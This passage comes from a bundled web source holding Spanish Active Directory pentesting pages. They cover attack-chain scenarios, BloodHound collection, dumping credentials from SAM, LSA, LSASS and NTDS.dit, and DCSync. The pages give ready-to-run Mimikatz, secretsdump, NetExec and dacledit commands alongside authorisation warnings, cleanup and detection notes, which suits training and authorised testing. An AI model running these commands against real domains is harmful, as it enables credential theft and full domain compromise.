  --target <target> --action remove --device-id <device-id>
\`\`\`

Eliminar la KeyCredential añadida es imprescindible para no dejar una puerta trasera persistente en el objeto.

**Detección**: cambios en \`msDS-KeyCredentialLink\` (requiere auditoría específica sobre ese atributo), autenticaciones PKINIT inesperadas para la cuenta.

> **Solo laboratorio / entorno autorizado.** Shadow Credentials modifica un atributo del AD y puede actuar como mecanismo de persistencia; no debe dejarse activo fuera de un ejercicio controlado.

**Si falla…**: verificar que la cuenta objetivo soporta PKINIT (algunas versiones de esquema AD antiguas no tienen el atributo \`msDS-KeyCredentialLink\`) y que el permiso \`GenericWrite\`/\`GenericAll\` sigue vigente.
`,xr=`Las técnicas aisladas rara vez ganan un dominio; lo que lo gana es **encadenarlas**. Esta página reúne los escenarios completos más habituales en laboratorios y pentests autorizados, cada uno como una cadena de decisión que enlaza con la página donde se explica cada paso en detalle.

> Todas las cadenas asumen un **entorno autorizado / laboratorio**. El objetivo es razonar el *attack path*, no ejecutar a ciegas.

***

## Domain Dominance

"Comprometer el dominio" no es lo mismo que "ser admin de una máquina". Conviene distinguir los niveles:

| Nivel | Qué es | Alcance |
|---|---|---|
| **Local Admin** | Administrador de **una** máquina | Esa máquina (y lo que contenga: hashes locales, sesiones). |
| **Domain Admin** | Miembro de *Domain Admins* | Control total del **dominio** (todos los equipos y usuarios). |
| **Enterprise Admin** | Miembro de *Enterprise Admins* | Control sobre **todo el forest** (todos los dominios). |
| **SYSTEM** | Cuenta de máquina con privilegios máximos **locales** | La máquina; en un DC, SYSTEM equivale a control del dominio. |

Evidencia que demuestra de verdad el compromiso del dominio: **volcado de NTDS.dit** (hashes de todo el dominio), el **hash de \`krbtgt\`**, o acceso administrativo demostrable a **todos los Domain Controllers**. Un \`whoami\` que diga \`Domain Admin\` es el objetivo; la prueba es lo que puedes hacer con él.

***

## Escenarios completos

### Escenario 1 — Password Spray → User → BloodHound → PrivEsc

\`\`\`text
Recon ↓ Identificar DC ↓ Enumerar usuarios ↓ Password Policy
   ↓ Password Spray ↓ Credenciales válidas ↓ BloodHound ↓ Attack Path ↓ Escalada
\`\`\`

Reconoces la red e identificas el DC ([Metodología](/pentesting/active-directory/metodologia)). Enumeras usuarios sin credenciales ([Enumeración](/pentesting/active-directory/enumeracion)) y **antes de probar nada** lees la política de contraseñas ([SMB/SYSVOL](/pentesting/active-directory/smb-sysvol)) para no bloquear cuentas. Haces un *password spray* controlado ([Password Attacks](/pentesting/active-directory/password-attacks)), consigues una credencial de bajo privilegio y la metes en [BloodHound](/pentesting/active-directory/bloodhound): el grafo revela una ruta hacia privilegios altos que validas y explotas.

### Escenario 2 — AS-REP Roast → Credentials → Enumeration

\`\`\`text
User Enumeration ↓ Pre-auth deshabilitada ↓ AS-REP ↓ Cracking offline
   ↓ Credenciales válidas ↓ LDAP ↓ BloodHound
\`\`\`

Durante la enumeración encuentras cuentas sin pre-autenticación Kerberos. Haces **AS-REP Roasting** sin credenciales ([Kerberos](/pentesting/active-directory/kerberos)), crackeas el \`$krb5asrep$\` offline ([Password Attacks](/pentesting/active-directory/password-attacks)) y, ya con credenciales, pasas a enumeración autenticada por [LDAP](/pentesting/active-directory/ldap) y [BloodHound](/pentesting/active-directory/bloodhound).

### Escenario 3 — Kerberoast → Service Account → Lateral Movement

\`\`\`text
Credenciales válidas ↓ Enumerar SPNs ↓ Pedir TGS ↓ Cracking offline
   ↓ Cuenta de servicio ↓ Evaluar privilegios ↓ Lateral Movement
\`\`\`

Con credenciales de dominio, enumeras SPNs y haces **Kerberoasting** ([Kerberos](/pentesting/active-directory/kerberos)). Crackeas la cuenta de servicio. **No asumas que eres Domain Admin**: evalúas sus privilegios en [BloodHound](/pentesting/active-directory/bloodhound) (grupos, sesiones, dónde es admin local) y, si procede, te mueves lateralmente ([Lateral Movement](/pentesting/active-directory/lateral-movement)).

### Escenario 4 — ACL Abuse

\`\`\`text
Usuario de bajo privilegio ↓ BloodHound ↓ GenericAll sobre un usuario objetivo
   ↓ Cambio de contraseña ↓ Nuevos privilegios
\`\`\`

BloodHound muestra que tu usuario tiene \`GenericAll\` sobre otro usuario más privilegiado. Lo confirmas y abusas ([ACL / ACE Abuse](/pentesting/active-directory/acl-ace)) — por ejemplo forzando un cambio de contraseña o con *Shadow Credentials* ([ADCS](/pentesting/active-directory/adcs)) — y heredas sus privilegios. **Cleanup** obligatorio.

### Escenario 5 — RBCD

\`\`\`text
GenericWrite sobre un equipo ↓ MachineAccountQuota ↓ Crear cuenta de equipo
   ↓ Configurar RBCD ↓ Ticket S4U ↓ Impersonar Administrator ↓ SYSTEM en el equipo
\`\`\`

Tienes \`GenericWrite\`/\`GenericAll\` sobre un equipo. Compruebas \`MachineAccountQuota\`, creas una cuenta de equipo, configuras **RBCD** y pides un ticket S4U impersonando a un usuario privilegiado ([Delegation](/pentesting/active-directory/delegation)). Obtienes acceso como SYSTEM en el equipo objetivo. **Cleanup**: quitar \`msDS-AllowedToActOnBehalfOfOtherIdentity\` y borrar la cuenta de equipo.

### Escenario 6 — DCSync → Golden Ticket

\`\`\`text
DCSync Rights ↓ Hash de krbtgt ↓ Domain SID ↓ Golden Ticket
   ↓ Autenticación Kerberos ↓ Compromiso del dominio
\`\`\`

Con derechos de replicación (propios de DA/DCs, o mal asignados y detectados en [BloodHound](/pentesting/active-directory/bloodhound)), haces **DCSync** para extraer el hash de \`krbtgt\` ([DCSync](/pentesting/active-directory/dcsync)). Con \`krbtgt\` + Domain SID forjas un **Golden Ticket** ([Tickets](/pentesting/active-directory/tickets)) y te autenticas como cualquier usuario del dominio.

### Escenario 7 — MSSQL Linked Server

\`\`\`text
Acceso a SQL ↓ Linked Server ↓ SQL Server 2 ↓ Cuenta de servicio
   ↓ Domain Admin ↓ Compromiso del dominio
\`\`\`

Accedes a un MSSQL (credenciales o Windows auth) y descubres un **Linked Server** hacia otro SQL con más privilegios ([MSSQL / Forest Trusts](/pentesting/active-directory/mssql-trusts)). Encadenas la ejecución a través del enlace, aterrizas en una cuenta de servicio privilegiada y escalas hacia el dominio.

***

> Patrón común a todos los escenarios: **Enumeración → Contexto → Hipótesis → Validación → Explotación → Post-explotación → Siguiente ataque.** Cuando una cadena se atasca, vuelve a enumerar con lo nuevo que tengas (una credencial cambia por completo lo que puedes ver). La referencia rápida está en [Quick Reference](/pentesting/active-directory/reference).
`,Sr=`BloodHound es la herramienta de referencia para mapear relaciones de Active Directory y descubrir attack paths hacia privilegios elevados. En un entorno de laboratorio u autorizado, convierte una enumeración manual tediosa en un grafo navegable que muestra exactamente qué camino lleva de un usuario de bajo privilegio a Domain Admin.

## ¿Qué es BloodHound?

BloodHound usa teoría de grafos para representar un dominio de Active Directory: los **nodos** son objetos (usuarios, grupos, equipos, GPOs, OUs, dominios) y las **aristas (edges)** son relaciones y permisos entre ellos (pertenencia a grupos, sesiones activas, permisos ACL, delegaciones, etc.). Esto permite responder preguntas como "¿qué camino más corto existe entre este usuario y Domain Admins?" sin tener que correlacionar manualmente decenas de comandos.

Los datos se obtienen con **colectores**:

- **SharpHound** — colector oficial en C#/PowerShell para Windows, se ejecuta dentro del dominio (o con credenciales válidas).
- **bloodhound.py / bloodhound-python** — colector en Python para Linux, pensado para ejecutarse de forma remota contra el DC usando credenciales (contraseña, hash NTLM o ticket Kerberos).

Ambos recopilan la misma clase de información: usuarios, grupos, equipos, OUs, GPOs, sesiones de usuario activas, permisos ACL, relaciones de confianza, delegaciones Kerberos y membresías de grupos locales (admin, RDP, etc.).

Un **relationship (edge)** no es solo informativo: muchas aristas representan un permiso o condición que puede **abusarse** para escalar privilegios o moverse lateralmente. Un **attack path** es la cadena de edges que conecta un nodo de partida (el usuario comprometido) con un nodo objetivo (normalmente Domain Admins o el DC), y es el núcleo del análisis en BloodHound.

> **Solo laboratorio / entorno autorizado.** La recolección masiva de BloodHound genera mucho tráfico LDAP y, con SharpHound, consultas WMI/SMB a cada equipo. Ejecútalo solo con autorización expresa.

***

## Recolección

**Desde Linux (bloodhound-python / bloodhound.py)**

\`\`\`bash
bloodhound-python -u <usuario> -p '<password>' -d <dominio> -ns <dc-ip> -c All
\`\`\`

> **Nota de compatibilidad.** El paquete se distribuye como \`bloodhound-python\` (antes \`bloodhound.py\`); en algunas instalaciones el binario sigue llamándose \`bloodhound.py\`. Comprueba con \`bloodhound-python --help\` o \`which bloodhound.py\`.

También admite autenticación con hash NTLM (\`--hashes\`) o ticket Kerberos (\`-k --no-pass\` con \`KRB5CCNAME\` exportado), útil tras un \`credential-dumping\` o un ataque de \`kerberos\`.

**Desde Windows (SharpHound / SharpHound.exe)**

\`\`\`powershell
SharpHound.exe -c All
\`\`\`

Métodos de colección (\`-c\` / \`-CollectionMethod\`) más relevantes:

| Método | Qué recopila |
| --- | --- |
| \`Default\` | Grupos, sesiones, ACLs básicas, trusts — buen punto de partida |
| \`All\` | Todo lo anterior + delegaciones, GPOs, objetos de contenedor |
| \`Session\` | Solo sesiones de usuario activas (\`NetSessionEnum\`) |
| \`LoggedOn\` | Sesiones vía registro remoto (requiere admin local) |
| \`ACL\` | Solo permisos/ACLs sobre objetos del dominio |
| \`Group\` | Solo membresías de grupos |
| \`LocalAdmin\` / \`RDP\` / \`DCOM\` / \`PSRemote\` | Membresías de grupos locales privilegiados por equipo |
| \`Trusts\` | Relaciones de confianza entre dominios/bosques |

**Diferencias de colección**: SharpHound, al ejecutarse dentro de la red, puede alcanzar \`Session\`/\`LoggedOn\` contra cada equipo (más ruidoso, requiere resolución de nombres y conectividad SMB/WMI a los hosts). bloodhound.py, al operar solo contra el DC vía LDAP, recoge con fiabilidad ACLs, grupos, OUs y GPOs, pero su soporte de \`Session\`/\`LoggedOn\` es más limitado. Para una imagen completa conviene combinar ambos cuando sea posible, o al menos usar \`All\` desde el que esté disponible.

***

## Flujo de análisis

\`\`\`text
Upload
  ↓
Analyze
  ↓
Find shortest path
  ↓
Identify privilege
  ↓
Validate manually
  ↓
Exploit
\`\`\`

Tras subir los datos a BloodHound (interfaz web), el análisis sigue este ciclo: localizar el camino más corto hacia el objetivo, identificar qué privilegio o edge concreto lo hace posible, **validar manualmente** esa condición contra el entorno real (los datos pueden estar desactualizados) y solo entonces explotarla.

***

## Queries importantes

- **Domain Admins** — lista los miembros actuales del grupo, el objetivo típico de cualquier attack path.
- **Shortest Paths to Domain Admins** — calcula el/los camino(s) más corto(s) desde cualquier principal hacia DA; es el punto de partida habitual del análisis.
- **DCSync Rights** — qué principales tienen \`DS-Replication-Get-Changes\`/\`-All\` sobre el dominio, permitiendo un DCSync directo (ver [DCSync](/pentesting/active-directory/dcsync)).
- **Local Admin** — qué usuarios son administradores locales en qué equipos, base del movimiento lateral (ver [lateral-movement](/pentesting/active-directory/lateral-movement)).
- **AS-REP Roastable** — cuentas con preautenticación Kerberos deshabilitada, vulnerables a AS-REP Roasting (ver [kerberos](/pentesting/active-directory/kerberos)).
- **Kerberoastable** — cuentas de servicio (con SPN) susceptibles de Kerberoasting (ver [kerberos](/pentesting/active-directory/kerberos)).
- **Unconstrained Delegation** — equipos o cuentas con delegación sin restricciones, un objetivo clásico para captura de TGTs (ver [delegation](/pentesting/active-directory/delegation)).
- **ACL relationships** — todas las relaciones de control (GenericAll, GenericWrite, WriteDACL, etc.) que un principal tiene sobre otros objetos (ver [acl-ace](/pentesting/active-directory/acl-ace)).

***

## Interpretar los edges

| Edge | Significado | Dónde explotarlo |
| --- | --- | --- |
| \`GenericAll\` | Control total sobre el objeto | [acl-ace](/pentesting/active-directory/acl-ace) |
| \`GenericWrite\` | Permite modificar atributos del objeto | [acl-ace](/pentesting/active-directory/acl-ace) |
| \`WriteDacl\` | Permite modificar la ACL del objeto | [acl-ace](/pentesting/active-directory/acl-ace) |
| \`WriteOwner\` | Permite cambiar el propietario del objeto | [acl-ace](/pentesting/active-directory/acl-ace) |
| \`AddMember\` | Permite añadir miembros a un grupo | [acl-ace](/pentesting/active-directory/acl-ace) |
| \`ForceChangePassword\` | Permite resetear la contraseña sin conocerla | [acl-ace](/pentesting/active-directory/acl-ace) |
| \`AdminTo\` | El principal es administrador local del equipo | [lateral-movement](/pentesting/active-directory/lateral-movement) |
| \`HasSession\` | Hay una sesión activa de ese usuario en el equipo | [lateral-movement](/pentesting/active-directory/lateral-movement) / [credential-dumping](/pentesting/active-directory/credential-dumping) |
| \`MemberOf\` | Pertenencia directa a un grupo | — |
| \`CanRDP\` | El principal puede conectar por RDP al equipo | [lateral-movement](/pentesting/active-directory/lateral-movement) |
| \`CanPSRemote\` | El principal puede conectar por WinRM al equipo | [lateral-movement](/pentesting/active-directory/lateral-movement) |

> **Validar siempre manualmente.** BloodHound refleja el estado del dominio en el momento de la recolección: permisos revocados, contraseñas ya rotadas o cuentas deshabilitadas después de la recolección producen falsos positivos en el grafo. Antes de ejecutar cualquier abuso, confirma el edge con una comprobación directa (por ejemplo, \`Get-ObjectAcl\` o \`dacledit.py\` para una ACL) y nunca asumas que el camino sigue siendo válido solo porque aparece en el grafo.
`,Cr=`Una vez obtenido acceso local o privilegios suficientes en el dominio, el *credential dumping* permite extraer material de autenticación almacenado en distintas capas del sistema y de Active Directory. Esta página es el **hub**: visión general del almacenamiento de credenciales y de las fuentes locales (SAM, LSA Secrets, LSASS) y de dominio (NTDS.dit). La técnica estrella, **DCSync**, tiene su propia página con todo el detalle: [DCSync](/pentesting/active-directory/dcsync). Y la realidad de ejecutar **Mimikatz** frente a Windows Defender / EDR —cómo diagnosticar un bloqueo y elegir otra implementación de la misma técnica— está en [Mimikatz y AV/EDR](/pentesting/active-directory/mimikatz).

> **Solo laboratorio / entorno autorizado.** Todas las técnicas de volcado de credenciales acceden a material altamente sensible; ejecútalas solo en laboratorios, CTFs o sistemas con autorización explícita. Las que modifican AD incluyen su *cleanup*.

Obtener un hash **no** significa acceso inmediato: el resultado hay que **validarlo** (¿de qué cuenta es?, ¿qué privilegios tiene?) antes de decidir el siguiente paso.

***

## ¿Qué puedo obtener?

Tipos de material de autenticación y qué implican:

| Material | Qué es |
|---|---|
| Plaintext password | Contraseña en claro (WDigest, configs, GPP…). |
| NTLM hash | Hash NT reutilizable para Pass-the-Hash. |
| Kerberos keys / TGT / TGS | Material para Pass-the-Ticket / Overpass-the-Hash. |
| LSA Secrets | Secretos de servicios/sistema y credenciales de cuentas de máquina. |
| Machine / Service account creds | Credenciales de equipos y cuentas de servicio. |
| Certificate + private key | Autenticación por certificado (PKINIT / Pass-the-Cert). |

## Dónde se almacenan

\`\`\`text
Windows
├── SAM          → hashes de cuentas LOCALES
├── LSA Secrets  → secretos de servicios/sistema, cuentas de máquina
├── LSASS        → material de autenticación en memoria (sesiones activas)
└── Active Directory
    └── NTDS.dit  → hashes de TODAS las cuentas del dominio (+ krbtgt)
\`\`\`

| Fuente | Contenido | Privilegios típicos | Alcance |
|---|---|---|---|
| SAM | Hashes de cuentas locales | Admin local | Local |
| LSA Secrets | Secretos de servicio/sistema, cuentas de máquina | SYSTEM / Admin local | Local → a veces dominio |
| LSASS | Credenciales en memoria (hashes, tickets, a veces claro) | SYSTEM / \`SeDebugPrivilege\` | Local → sesiones activas |
| NTDS.dit | Todos los hashes del dominio (+ krbtgt) | Admin de dominio / acceso al DC | Dominio completo |
| [DCSync](/pentesting/active-directory/dcsync) | Replicación remota de secretos del dominio | Derechos de replicación | Dominio completo (sin tocar el DC) |

***

## SAM

### ¿Qué es?

La base \`Security Account Manager\` almacena los hashes NT de las cuentas locales de una máquina Windows (no de dominio).

**Desde Windows**

\`\`\`powershell
reg save HKLM\\SAM sam
reg save HKLM\\SYSTEM system
\`\`\`

**Desde Linux (parseo offline)**

\`\`\`bash
secretsdump.py -sam sam -system system LOCAL
\`\`\`

**Remoto (con credenciales válidas)**

\`\`\`bash
secretsdump.py <dominio>/<usuario>:<password>@<target>
\`\`\`

### Resultado esperado

\`\`\`text
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nthash>:::
\`\`\`

### Interpretación

Un hash de Administrator local reutilizado en varias máquinas habilita Pass-the-Hash lateral (ver [Movimiento lateral](/pentesting/active-directory/lateral-movement)).

### Si falla

- Acceso denegado al guardar \`HKLM\\SAM\`: requiere privilegios de administrador local.

***

## LSA Secrets

### ¿Qué es?

Los \`LSA Secrets\` son secretos que el **Local Security Authority** guarda cifrados en el registro (\`HKLM\\SECURITY\\Policy\\Secrets\`). Pueden contener credenciales muy útiles: contraseñas de **cuentas de servicio**, de **tareas programadas**, credenciales almacenadas, claves de confianza y la credencial de la **cuenta de máquina** del equipo en el dominio.

**Desde Linux (remoto o parseo offline)**

\`\`\`bash
secretsdump.py <dominio>/<usuario>:<password>@<target>   # incluye LSA Secrets
secretsdump.py -security security -system system LOCAL   # offline, desde los hives
\`\`\`

**Desde Windows (Mimikatz)**

\`\`\`text
mimikatz # privilege::debug
mimikatz # lsadump::secrets
\`\`\`

### Interpretación

Una contraseña de **cuenta de servicio** aquí puede abrir acceso a otros sistemas o, si la cuenta está sobre-privilegiada, a la escalada. La credencial de la **cuenta de máquina** es la base de ataques como RBCD o Silver Ticket (ver [Delegation](/pentesting/active-directory/delegation) y [Tickets](/pentesting/active-directory/tickets)).

### Si falla

- Requiere privilegios de administrador local / SYSTEM para leer \`HKLM\\SECURITY\`.

***

## LSASS

### ¿Qué es?

El proceso \`lsass.exe\` mantiene en memoria las credenciales usadas para autenticación activa: hashes NT, tickets Kerberos y, según configuración, contraseñas en texto claro (WDigest).

**Desde Windows (Mimikatz)**

\`\`\`powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
\`\`\`

**Volcado con comsvcs.dll (sin Mimikatz)**

\`\`\`powershell
rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID_lsass> lsass.dmp full
\`\`\`

**Desde Linux (parseo del dump)**

\`\`\`bash
pypykatz lsa minidump lsass.dmp
\`\`\`

### Resultado esperado

\`\`\`text
Username: Administrator
NTLM: <nthash>
\`\`\`

### Interpretación

Hashes y tickets extraídos aquí reflejan sesiones activas en la máquina; útiles para Pass-the-Hash o Pass-the-Ticket inmediato.

> **Solo laboratorio / entorno autorizado.** Tocar LSASS (volcado o inyección) es una operación sensible, altamente monitorizada por EDR/AV, y solo debe realizarse en laboratorio o con autorización explícita.

### Detección

Acceso a \`lsass.exe\` por procesos no habituales (Event ID 4663 con \`ProcessAccess\`, o alertas de EDR sobre \`MiniDumpWriteDump\`).

### Si falla

- Acceso denegado al abrir el proceso: requiere privilegios SYSTEM o \`SeDebugPrivilege\`.
- EDR bloquea el volcado: valorar técnicas alternativas (fuera del alcance de esta página).

***

## NTDS.dit

### ¿Qué es?

\`NTDS.dit\` es la base de datos de Active Directory, ubicada en \`C:\\Windows\\NTDS\\ntds.dit\` en cada Domain Controller. Contiene todos los hashes de todas las cuentas del dominio, incluida \`krbtgt\`, por lo que es uno de los objetivos más críticos de un compromiso de dominio.

### Métodos de extracción

**Remote Dump** (credenciales de administrador de dominio, remoto, sin tocar el disco del DC directamente)

\`\`\`bash
secretsdump.py <dominio>/<usuario>:<password>@<dc-ip>
\`\`\`

**Volume Shadow Copy** (acceso local/RDP al DC)

\`\`\`powershell
vssadmin create shadow /for=C:
\`\`\`

Después se copia \`ntds.dit\` desde la shadow copy montada.

**\`ntdsutil\`** (acceso local/RDP al DC)

\`\`\`powershell
ntdsutil "ac i ntds" "ifm" "create full C:\\temp" q q
\`\`\`

**Offline parsing** (ya con \`ntds.dit\` y el hive \`SYSTEM\` extraídos)

\`\`\`bash
secretsdump.py -ntds ntds.dit -system system LOCAL
\`\`\`

### Requisitos y riesgos

| Método | Requisito | Riesgo de detección |
|---|---|---|
| Remote Dump | Credenciales de Domain Admin | Alto (tráfico DRSUAPI) |
| VSS / ntdsutil | Acceso local o RDP al DC | Medio (ejecución de herramientas en el DC) |
| Offline parsing | Ya disponer de los ficheros | Bajo (se realiza fuera del DC) |

### Resultado esperado

\`\`\`text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nthash>:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<nthash>:::
\`\`\`

### Interpretación

Obtener \`ntds.dit\` equivale a comprometer todo el dominio: se dispone de todos los hashes, incluido \`krbtgt\`, que permite forjar Golden Tickets (ver [Tickets Kerberos](/pentesting/active-directory/tickets)).

> **Solo laboratorio / entorno autorizado.** Extraer NTDS.dit compromete la totalidad del dominio; practícalo solo en laboratorio o con autorización explícita.

### Si falla

- Acceso denegado en \`ntdsutil\`: requiere privilegios de administrador local en el DC.
- \`vssadmin\` falla: comprobar espacio en disco y permisos.

***

## DCSync

**DCSync** abusa del mecanismo legítimo de replicación de Active Directory (DRSUAPI / \`DsGetNCChanges\`) para pedir a un Domain Controller los secretos de **cualquier** cuenta —incluida \`krbtgt\`— **sin acceso local al DC ni extraer \`ntds.dit\`**. Solo requiere una cuenta con derechos de replicación (\`DS-Replication-Get-Changes\` y \`-All\`), que a veces están mal asignados a usuarios no privilegiados (ver [ACL / ACE Abuse](/pentesting/active-directory/acl-ace)).

Es la técnica de *credential dumping* de mayor impacto en AD y tiene **página propia** con el detalle completo —enumeración con BloodHound, ejecución con Impacket/NetExec/Mimikatz/Metasploit, concesión/eliminación de derechos (BloodyAD, \`ldap_shell\`, \`dacledit\`), NTLM Relay → DCSync, Pass-the-Cert, flujos a PtH y Golden Ticket, detección/SIEM, mitigación, cleanup y troubleshooting:

> **→ [DCSync (página completa)](/pentesting/active-directory/dcsync)**

Resumen mínimo para consulta rápida:

\`\`\`bash
# Linux (Impacket): volcar todo el dominio / solo krbtgt
secretsdump.py <dominio>/<usuario>:<password>@<dc-ip> -just-dc
secretsdump.py <dominio>/<usuario>:<password>@<dc-ip> -just-dc-user krbtgt
\`\`\`

Obtener el NT de una cuenta administrativa → [Pass-the-Hash](/pentesting/active-directory/lateral-movement); obtener el NT de \`krbtgt\` → [Golden Ticket](/pentesting/active-directory/tickets).

***

## Attack paths y checklist

El encadenamiento (Replication Rights → DCSync → PtH/Golden Ticket) y la checklist detallada están en la [página de DCSync](/pentesting/active-directory/dcsync). Para el resto de fuentes:

- [ ] Identificar si tienes **admin local** → volcar SAM / LSA Secrets / LSASS
- [ ] Reutilizar hashes locales (Pass-the-Hash) para moverte lateralmente
- [ ] Comprobar derechos de replicación → [DCSync](/pentesting/active-directory/dcsync)
- [ ] Si llegas a un DC → NTDS.dit (dominio completo)
- [ ] Identificar \`krbtgt\` → [Golden Ticket](/pentesting/active-directory/tickets)
- [ ] Documentar la evidencia y revertir modificaciones
`,wr=`DCSync es la técnica central de *credential dumping* en Active Directory: en lugar de tocar el disco de un Domain Controller, **abusa del mecanismo legítimo de replicación** para pedirle al DC que entregue los secretos de cualquier cuenta — incluida \`krbtgt\`. Esta página amplía el resumen de [Credential Dumping](/pentesting/active-directory/credential-dumping) con el detalle completo: requisitos, enumeración, ejecución con cada herramienta, concesión/eliminación de derechos, cadenas avanzadas, detección y mitigación.

> **Solo laboratorio / entorno autorizado.** DCSync expone el dominio completo. Ejecútalo únicamente en laboratorios, CTFs o sistemas con autorización explícita. Las técnicas de esta página que **modifican objetos o permisos de Active Directory** incluyen su procedimiento de *cleanup*: realízalo siempre al terminar.

***

## ¿Qué es DCSync?

Los Domain Controllers se replican entre sí mediante el **Directory Replication Service (DRS)**, expuesto por la interfaz RPC **DRSUAPI**. La operación clave es **\`DsGetNCChanges\`**, que un DC usa para pedir a otro los cambios de una partición del directorio (incluidos los hashes).

DCSync **simula ser un Domain Controller** y solicita esos datos. El DC responde con el material de credenciales si la identidad que pregunta tiene los permisos de replicación adecuados.

\`\`\`text
Domain Controller
      ↓  (DRSUAPI / MS-DRSR)
  Replication
      ↓
DS-Replication permissions
      ↓
  DsGetNCChanges
      ↓
Credential Material (NT hashes, claves Kerberos, krbtgt…)
\`\`\`

Por eso no hace falta ejecutar nada en el DC ni extraer \`ntds.dit\`: basta con **credenciales de una cuenta con derechos de replicación** y conectividad de red al DC.

***

## Requisitos

DCSync necesita que la cuenta utilizada tenga, sobre el **objeto dominio**, los derechos extendidos:

- \`DS-Replication-Get-Changes\`
- \`DS-Replication-Get-Changes-All\`

(En algunos escenarios también interviene \`DS-Replication-Get-Changes-In-Filtered-Set\`.)

**¿Quién suele tenerlos?** Domain Admins, Enterprise Admins, Administrators y la propia cuenta de máquina de los Domain Controllers.

**¿Por qué podría tenerlos un usuario normal?** Porque se asignan por error o por comodidad a cuentas no privilegiadas:

- Herramientas de **backup** de AD.
- **Integraciones de terceros** (sincronización de identidades, etc.).
- **Cuentas de servicio** sobre-privilegiadas.
- **Configuraciones legacy** que nunca se revisaron.
- **Asignación excesiva de privilegios** en general.

Cuando eso ocurre, un usuario de bajo privilegio puede ejecutar DCSync y comprometer el dominio. Encontrar esa mala configuración es exactamente lo que buscamos con BloodHound.

***

## Enumerar DCSync con BloodHound

El razonamiento, no solo el comando:

\`\`\`text
Tengo USER-A
     ↓
BloodHound
     ↓
¿Qué permisos tiene sobre el dominio?
     ↓
¿Tiene DS-Replication-Get-Changes y ...-All?
     ↓
¿Puede ejecutar DCSync?
\`\`\`

Recolecta con la cuenta comprometida y revisa sus derechos sobre el objeto dominio:

\`\`\`bash
bloodhound-python -u <usuario> -p '<password>' -ns <dc-ip> -d <dominio> -c All
\`\`\`

En la interfaz de BloodHound, busca el nodo del usuario y mira sus *Outbound Object Control*: la arista **\`DCSync\`** (o la combinación de **\`GetChanges\`** + **\`GetChangesAll\`**) hacia el dominio confirma que la cuenta puede replicar secretos. Valida siempre el permiso de forma directa antes de asumirlo (ver [BloodHound](/pentesting/active-directory/bloodhound) y [ACL / ACE Abuse](/pentesting/active-directory/acl-ace)).

***

## Ejecutar DCSync

### Impacket — secretsdump

\`\`\`bash
# Volcar todos los secretos del dominio vía replicación
impacket-secretsdump '<dominio>'/'<usuario>':'<password>'@'<dc-ip>' -just-dc

# Solo una cuenta concreta (p. ej. krbtgt)
impacket-secretsdump '<dominio>'/'<usuario>':'<password>'@'<dc-ip>' -just-dc-user krbtgt
\`\`\`

* **Qué hace**: establece la conversación DRSUAPI y pide los hashes vía \`DsGetNCChanges\`.
* **Qué necesita**: credenciales (o hash con \`-hashes\`) de una cuenta con derechos de replicación.
* **Qué buscar en la salida**: líneas \`usuario:RID:lmhash:nthash:::\`, especialmente \`Administrator:500:\` y \`krbtgt:502:\`.

### NetExec — --ntds

\`\`\`bash
nxc smb <dc-ip> -u <usuario> -p '<password>' --ntds
nxc smb <dc-ip> -u <usuario> -p '<password>' --ntds --user administrator
\`\`\`

NetExec valida los permisos y realiza el volcado por replicación (\`--ntds\`), con la opción de filtrar un usuario.

> **Nota de compatibilidad.** NetExec (\`nxc\`) es el sucesor de CrackMapExec (\`crackmapexec\`/\`cme\`); la sintaxis de \`--ntds\` ha variado entre versiones. Es **sintaxis dependiente de versión**: si una opción no existe, consulta \`nxc smb --help\` de tu versión en lugar de asumirla.

### Mimikatz

\`\`\`text
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:<dominio>\\<target_user>
mimikatz # lsadump::dcsync /domain:<dominio> /user:krbtgt
\`\`\`

* **\`privilege::debug\`**: solicita \`SeDebugPrivilege\` (necesario para varias operaciones de Mimikatz; para DCSync basta con los derechos de replicación de la cuenta, pero es el primer comando habitual).
* **\`lsadump::dcsync\`**: lanza la replicación contra el DC. Si Mimikatz está bloqueado por AV/EDR en el endpoint, la misma técnica se consigue con Impacket o NetExec (ver [Mimikatz y AV/EDR](/pentesting/active-directory/mimikatz)).
* **Usuario concreto vs \`krbtgt\`**: pedir un usuario devuelve su hash (útil para PtH); pedir **\`krbtgt\`** devuelve la clave que permite forjar Golden Tickets — el objetivo de mayor impacto.

### Metasploit

\`\`\`text
use auxiliary/scanner/smb/impacket/secretsdump
set RHOSTS <dc-ip>
set SMBUser <usuario>
set SMBPass <password>
run
\`\`\`

Alternativa dentro de Metasploit que envuelve \`secretsdump\` para el volcado por replicación.

***

## Conceder y quitar derechos DCSync

Si controlas una cuenta con permisos para modificar la ACL del dominio (p. ej. \`WriteDACL\` sobre el objeto dominio, ver [ACL / ACE Abuse](/pentesting/active-directory/acl-ace)), puedes **otorgarte** los derechos de replicación, hacer DCSync y luego **retirarlos**.

> **Peligro — modifica ACLs de Active Directory.** Estas acciones cambian permisos del dominio. Haz siempre el *cleanup* (abajo) tras la prueba.

### BloodyAD

\`\`\`bash
# Conceder DCSync a un usuario
bloodyAD --host <dc> -d <dominio> -u <admin> -p '<password>' add dcsync <usuario>

# Quitarlo (cleanup)
bloodyAD --host <dc> -d <dominio> -u <admin> -p '<password>' remove dcsync <usuario>
\`\`\`

### ldap_shell

Dentro de \`ldap_shell\` (shell LDAP interactiva de Impacket/ntlmrelayx):

\`\`\`text
set_dcsync <usuario>      # Conceder derechos de replicación
del_dcsync <usuario>      # Quitarlos (cleanup)
\`\`\`

### Impacket — dacledit

\`\`\`bash
# Escribir derechos DCSync sobre el objeto raíz del dominio
dacledit.py -action write -rights DCSync -principal <usuario> \\
  -target-dn 'DC=<dominio>,DC=local' '<dominio>/<admin>:<password>'

# Quitarlos (cleanup)
dacledit.py -action remove -rights DCSync -principal <usuario> \\
  -target-dn 'DC=<dominio>,DC=local' '<dominio>/<admin>:<password>'
\`\`\`

***

## DCSync vía NTLM Relay

Si no tienes credenciales con derechos de replicación pero puedes **forzar que una identidad privilegiada se autentique** contra ti (coerción) y el destino no exige firma, puedes **relayar** esa autenticación a LDAP del DC para concederte DCSync o abusar directamente.

\`\`\`text
Coerción / name poisoning
      ↓
Autenticación privilegiada (p. ej. de un DC)
      ↓
NTLM Relay (ntlmrelayx → LDAP del DC)
      ↓
Abuso de permisos (set_dcsync)
      ↓
